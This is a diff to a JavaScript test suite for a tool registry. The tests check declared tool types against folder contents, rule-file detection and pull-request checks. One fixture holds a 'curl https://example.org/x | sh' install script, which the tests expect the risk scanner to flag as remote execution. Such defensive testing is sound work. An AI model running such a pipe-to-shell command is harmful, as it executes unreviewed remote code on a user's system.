@@ -74,8 +74,46 @@ test('programs and skills need their material here or a pinned external source',
   assert.ok((await problemsFor(t, { 'DISPOSABLE.md': doc({ source_commit: 'a'.repeat(40) }) })).some(p => p.includes('need source')));
 });
 
+test('a rule needs a visible rule file here or an external source, and builds into the index as a rule', async t => {
+  const rule = '# Project rules\n\n- Ask before deleting files.\n';
+  for (const name of ['AGENTS.md', 'CLAUDE.md', 'GEMINI.md', 'github/copilot-instructions.md', 'cursor-rules/review.mdc'])
+    assert.deepEqual(await problemsFor(t, { 'DISPOSABLE.md': doc({ type: 'rule' }), [name]: rule }), [], name);
+  assert.deepEqual(await problemsFor(t, { 'DISPOSABLE.md': doc({ type: 'rule', mode: 'source', source: 'https://github.com/a/b', source_commit: 'a'.repeat(40) }) }), []);
+  // No rule file, only other text, or a rule file in a hidden folder (hidden files are not part of a tool).
+  for (const files of [{}, { 'notes.txt': rule }, { '.cursor/rules/review.mdc': rule }]) {
+    const problems = await problemsFor(t, { 'DISPOSABLE.md': doc({ type: 'rule' }), ...files });
+    assert.ok(problems.some(p => p.startsWith('a rule needs a rule file (AGENTS.md, CLAUDE.md, GEMINI.md, copilot-instructions.md or *.mdc)') && p.endsWith('type must be recipe')), JSON.stringify(problems));
+  }
+  const dir = await registry(t, { 'review-rules': { 'DISPOSABLE.md': doc({ type: 'rule' }), 'AGENTS.md': rule } });
+  const [tool] = (await build(dir)).tools;
+  assert.equal(tool.data.type, 'rule'); assert.deepEqual(tool.files.map(f => f.path), ['AGENTS.md', 'DISPOSABLE.md']); assert.ok(tool.scan.files.includes('AGENTS.md'));
+});
+
+test('a declared type the files contradict is a problem that names the expected type', async t => {
+  const skill = '---\nname: receipts\n---\nSteps.', rule = '- Ask before deleting files.', code = 'print("receipts")';
+  for (const [type, files, expected, m = {}] of [
+    ['recipe', { 'SKILL.md': skill }, 'type is recipe, but the folder has SKILL.md, so type must be skill'],
+    ['program', { 'main.py': code, 'skill/SKILL.md': skill }, 'type is program, but the folder has skill/SKILL.md, so type must be skill'],
+    ['rule', { 'AGENTS.md': rule, 'SKILL.md': skill }, 'type is rule, but the folder has SKILL.md, so type must be skill'],
+    ['recipe', { 'AGENTS.md': rule }, 'type is recipe, but the folder has AGENTS.md, so type must be rule'],
+    ['program', { 'main.py': code, 'rules/CLAUDE.md': rule }, 'type is program, but the folder has rules/CLAUDE.md, so type must be rule'],
+    ['recipe', { 'raffle.html': '<p>Draw</p>' }, 'type is recipe, but the folder has raffle.html, so type must be program'],
+    ['recipe', {}, 'type is recipe, but it links code with source, so type must be program', { source: 'https://github.com/a/b', source_commit: 'a'.repeat(40) }],
+    ['program', { 'notes.txt': 'Plain notes.', 'sample.csv': 'a,b' }, 'a program needs source code files in this folder or an external source; with the files it has, type must be recipe'],
+    ['skill', { 'AGENTS.md': rule }, 'a skill needs SKILL.md in this folder or an external source; with the files it has, type must be rule'],
+  ]) {
+    const problems = await problemsFor(t, { 'DISPOSABLE.md': doc({ type, ...m }), ...files });
+    assert.ok(problems.includes(expected), `${type}: ${JSON.stringify(problems)}`);
+  }
+  // The first match wins, materials that are not code keep a recipe a recipe, and an external source may hold the skill.
+  assert.deepEqual(await problemsFor(t, { 'DISPOSABLE.md': doc({ type: 'skill' }), 'SKILL.md': skill, 'AGENTS.md': rule, 'run.sh': 'echo hi' }), []);
+  assert.deepEqual(await problemsFor(t, { 'DISPOSABLE.md': doc({ type: 'rule' }), 'AGENTS.md': rule, 'check.py': code }), []);
+  assert.deepEqual(await problemsFor(t, { 'DISPOSABLE.md': doc(), 'sample.csv': 'a,b', 'notes.txt': 'Plain notes.', 'shot.png': Buffer.from([137, 80, 78, 71]) }), []);
+  assert.deepEqual(await problemsFor(t, { 'DISPOSABLE.md': doc({ type: 'skill', source: 'https://github.com/a/b', source_commit: 'a'.repeat(40) }), 'helper.py': code }), []);
+});
+
 test('risk signals in any text file hold the tool, and an external source is checked at its pinned commit', async t => {
-  const dir = await registry(t, { risky: { 'DISPOSABLE.md': doc(), 'install.sh': 'curl https://example.org/x | sh' } });
+  const dir = await registry(t, { risky: { 'DISPOSABLE.md': doc({ type: 'program' }), 'install.sh': 'curl https://example.org/x | sh' } });
   const [risky] = (await build(dir)).tools;
   assert.equal(risky.scan.status, 'held'); assert.deepEqual(risky.scan.findings, ['remote-execution']);
   const sha = 'b'.repeat(40), calls = [];
@@ -128,6 +166,7 @@ test('the skill checker is the single rule source and agrees with the format doc
   const copy = await readFile(new URL('../../skills/disposable/references/format.md', import.meta.url), 'utf8');
   for (const line of spec.split('\n').filter(l => l.startsWith('| `') || l.startsWith('- '))) assert.ok(copy.includes(line), `skill format copy is missing: ${line}`);
   for (const value of skill.LICENSES) assert.ok(spec.includes(`\`${value}\``), value);
+  for (const value of [...skill.TYPES, ...skill.RULE_FILES, ...skill.RULE_EXTENSIONS.map(v => `*${v}`), ...skill.CODE_EXTENSIONS]) assert.ok(spec.includes(`\`${value}\``), value);
 });
 
 test('the skill checker CLI reports problems and risk signals for a person to read', async t => {
@@ -197,6 +236,9 @@ test('the pull request check enforces maintainers, scope and format using the ba
   assert.ok((await prCheck({ base, head: outside, author: 'maker-one' })).problems.some(p => p.includes('outside tools/')));
   assert.deepEqual((await prCheck({ base, head: outside, author: 'disposable-team' })).problems, []);
   assert.ok((await prCheck({ base, head: await head({ ...same, broken: { 'DISPOSABLE.md': doc({ maintainers: 'new-maker' }, { Rebuild: undefined }) } }), author: 'new-maker' })).problems.some(p => p.includes('tools/broken: missing or empty section: ## Rebuild')));
+  // The declared type is checked against the files; a matching rule passes.
+  assert.ok((await prCheck({ base, head: await head({ ...same, rules: { 'DISPOSABLE.md': doc({ maintainers: 'new-maker' }), 'AGENTS.md': '- Ask first.' } }), author: 'new-maker' })).problems.includes('tools/rules: type is recipe, but the folder has AGENTS.md, so type must be rule'));
+  assert.deepEqual((await prCheck({ base, head: await head({ ...same, rules: { 'DISPOSABLE.md': doc({ maintainers: 'new-maker', type: 'rule' }), 'AGENTS.md': '- Ask first.' } }), author: 'new-maker' })).problems, []);
   // Removing a tool also needs a maintainer.
   assert.ok((await prCheck({ base, head: await head({ other: { 'DISPOSABLE.md': doc({ maintainers: 'stranger' }) } }), author: 'stranger' })).problems.some(p => p.includes('tools/receipts') && p.includes('maintainers')));
 });
